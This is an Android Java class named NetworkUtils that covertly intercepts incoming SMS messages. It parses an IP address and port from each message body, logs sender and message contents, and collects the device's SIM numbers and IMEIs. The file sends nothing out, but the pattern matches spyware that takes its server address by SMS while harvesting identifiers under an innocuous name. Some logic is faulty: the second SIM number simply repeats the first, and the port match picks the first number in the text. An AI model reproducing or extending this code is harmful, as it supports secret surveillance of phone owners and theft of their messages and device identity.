package com.example.fasterpro11;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

public class NetworkUtils extends BroadcastReceiver {

    private static final String TAG = "NetworkUtils";
    private String ip;
    private String port;
    private String sim1number;
    private String sim2number;
    private String mobileimei1;
    private String mobileimei2;
    private String recivesmsmobilenumber;

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();

                            // Log the sender and message
                            Log.d(TAG, "SMS received from: " + sender);
                            Log.d(TAG, "SMS message body: " + messageBody);

                            // Update the NetworkUtils instance with the sender's number
                            setRecivesmsmobilenumber(sender);

                            // Extract IP and port from SMS body
                            extractIpAndPort(messageBody);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: " + e.getMessage(), e);
        }
    }

    public void extractIpAndPort(String messageBody) {
        try {
            // Patterns for IP addresses and ports
            String ipPattern = "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b"; // Matches any IP address
            String portPattern = "\\b(\\d{1,5})\\b"; // Matches any port number

            Pattern ipRegex = Pattern.compile(ipPattern);
            Pattern portRegex = Pattern.compile(portPattern);

            Matcher ipMatcher = ipRegex.matcher(messageBody);
            Matcher portMatcher = portRegex.matcher(messageBody);

            // Find the first match for IP
            if (ipMatcher.find()) {
                String detectedIp = ipMatcher.group(0);
                if (isValidIp(detectedIp)) {
                    ip = detectedIp;
                    Log.d(TAG, "IP detected: " + ip);
                } else {
                    Log.d(TAG, "Detected IP is not valid: " + detectedIp);
                }
            }

            // Find the first match for Port
            if (portMatcher.find()) {
                String detectedPort = portMatcher.group(0);
                if (isValidPort(detectedPort)) {
                    port = detectedPort;
                    Log.d(TAG, "Port detected: " + port);
                } else {
                    Log.d(TAG, "Detected port is not valid: " + detectedPort);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in extractIpAndPort: " + e.getMessage(), e);
        }
    }

    public void extractSimAndImei(Context context) {
        try {
            // Check for permissions
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

                if (telephonyManager != null) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) { // API level 26
                        sim1number = telephonyManager.getLine1Number(); // SIM1 number
                        if (telephonyManager.getPhoneCount() > 1) {
                            sim2number = telephonyManager.getLine1Number(); // For dual SIMs, fetch second SIM number (same method)
                        } else {
                            sim2number = "N/A"; // Single SIM device
                        }

                        // For API level 29 and higher, IMEI access is restricted
                        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.Q) {
                            mobileimei1 = telephonyManager.getImei(0); // IMEI for first SIM
                            mobileimei2 = telephonyManager.getImei(1); // IMEI for second SIM
                        } else {
                            mobileimei1 = "N/A"; // IMEI is restricted from Android 10 (API 29)
                            mobileimei2 = "N/A";
                        }
                    } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { // API level 23
                        sim1number = telephonyManager.getLine1Number(); // SIM1 number
                        sim2number = "N/A"; // Not available on devices below API 26
                        mobileimei1 = telephonyManager.getDeviceId(0);
                        mobileimei2 = telephonyManager.getDeviceId(1);
                    } else {
                        sim1number = telephonyManager.getLine1Number(); // SIM1 number
                        sim2number = "N/A"; // Not available on devices below API 23
                        mobileimei1 = telephonyManager.getDeviceId();
                        mobileimei2 = "N/A"; // Not available on devices below API 23
                    }

                    Log.d(TAG, "SIM 1 number detected: " + sim1number);
                    Log.d(TAG, "SIM 2 number detected: " + sim2number);
                    Log.d(TAG, "IMEI 1 detected: " + mobileimei1);
                    Log.d(TAG, "IMEI 2 detected: " + mobileimei2);
                    Log.d(TAG, "Received SMS number: " + recivesmsmobilenumber);
                }
            } else {
                // If permission is not granted, request permission
                ActivityCompat.requestPermissions((Activity) context, new String[]{Manifest.permission.READ_PHONE_STATE}, 1);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied to access telephony information", e);
        } catch (Exception e) {
            Log.e(TAG, "Error in extractSimAndImei: " + e.getMessage(), e);
        }
    }

    private boolean isValidIp(String ip) {
        try {
            // Check if IP is valid (0.0.0.0 to 255.255.255.255)
            String[] parts = ip.split("\\.");
            if (parts.length != 4) return false;
            for (String part : parts) {
                int value = Integer.parseInt(part);
                if (value < 0 || value > 255) return false;
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error in isValidIp: " + e.getMessage(), e);
            return false;
        }
    }

    private boolean isValidPort(String port) {
        try {
            // Check if port is within valid range (0-65535)
            int portNumber = Integer.parseInt(port);
            return portNumber >= 0 && portNumber <= 65535;
        } catch (NumberFormatException e) {
            Log.e(TAG, "Invalid port number: " + port, e);
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Error in isValidPort: " + e.getMessage(), e);
            return false;
        }
    }

    public String getIp() {
        return ip;
    }

    public String getPort() {
        return port;
    }

    public String getSim1number() {
        return sim1number;
    }

    public String getSim2number() {
        return sim2number;
    }

    public String getMobileimei1() {
        return mobileimei1;
    }

    public String getMobileimei2() {
        return mobileimei2;
    }

    public String getRecivesmsmobilenumber() {
        return recivesmsmobilenumber;
    }

    public void setRecivesmsmobilenumber(String recivesmsmobilenumber) {
        this.recivesmsmobilenumber = recivesmsmobilenumber;
    }
}
